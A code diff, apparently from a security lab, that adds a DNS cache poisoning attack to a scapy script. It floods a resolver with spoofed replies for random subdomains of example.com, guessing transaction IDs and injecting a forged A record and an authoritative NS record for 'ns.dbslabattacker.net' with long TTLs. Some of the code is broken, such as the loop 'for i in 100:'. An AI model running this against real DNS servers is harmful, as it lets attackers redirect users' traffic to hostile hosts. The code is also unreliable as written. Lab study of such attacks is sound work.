@@ -43,17 +43,44 @@ def sendPacket(sock, packet, ip, port):
     sock.sendto(str(packet), (ip, port))
 
 '''
-Example code that sends a DNS query using scapy.
+Sends a DNS query using scapy.
 '''
-def exampleSendDNSQuery():
+def SendDNSQuery():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
     dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
     sendPacket(sock, dnsPacket, my_ip, my_port)
+    response = sock.recv(4096)
+    spoof_response = DNS(response)
+
+    while 1:
+        spoof_random_domain = getRandomSubDomain() + ".example.com"
+
+        # Query the BIND server for a non-existing name
+        spoof_query = DNS(rd=1, qd=DNSQR(qname=spoof_random_domain))
+        sendPacket(sock, spoof_query, my_ip, my_port)
+
+        # Flood it with a stream of spoofed DNS replies
+        for i in 100:
+            # DNS fields:
+            # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html
+            spoof_response = DNS(id=getRandomTXID(), qr=1, aa=1, qd=spoof_query.qd,
+                                an=DNSRR(rrname=spoof_query.qd.qname, ttl=99999, rdata='1.2.3.4'),
+                                ns=DNSRR(rrname='example.com', ttl=99999, rdata='ns.dbslabattacker.net'))
+            sendPacket(sock, spoof_response, my_ip, my_query_port)
+
     response = sock.recv(4096)
     response = DNS(response)
     print "\n***** Packet Received from Remote Server *****"
     print response.show()
     print "***** End of Remote Server Packet *****\n"
+    
 
 if __name__ == '__main__':
-    exampleSendDNSQuery()
+    print("----DNS Cache Poisoning start----\n")
+    print("----INFO Section----")
+    print("Bind ip: %s" % my_ip)
+    print("DNS Proxy port number: %d" % my_port)
+    print("DNS Server port number: %d" % dns_port)
+    print("DNS Query port number: %d" % my_query_port)
+    print("--------------------\n")
+    SendDNSQuery()
